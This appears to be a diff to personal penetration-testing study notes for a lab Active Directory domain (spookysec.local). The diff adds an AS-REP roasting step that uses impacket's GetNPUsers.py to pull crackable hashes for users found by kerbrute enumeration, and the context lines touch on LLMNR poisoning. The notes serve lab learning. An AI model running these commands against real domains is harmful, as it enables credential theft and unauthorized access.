@@ -2,6 +2,11 @@
 Only do usernames as to not lockout users <br>
 Located in my downloads <br>
 ./kerbrute_linux_amd64 userenum -d spookysec.local --dc 10.10.103.225 users.txt <br>
+<br>
+<h1> Query Ticket auth with no password </h1><br>
+take valid usernames from kerbrute and place into new user file <br>
+sudo python3 /home/kali/impacket/examples/GetNPUsers.py -dc-ip 10.10.103.225 spookysec.local/ -usersfile users.txt -format john -outputfile hashes <br>
+cat hashes - look for any usernames with hashes here to crack <br>
 
 <h1>LLMNR Poisoning</h1><br>
 fallback with share that is unknown, device reaches out with broadcast to see if any device knows the share, malicious machine asks for hash to direct user <br>
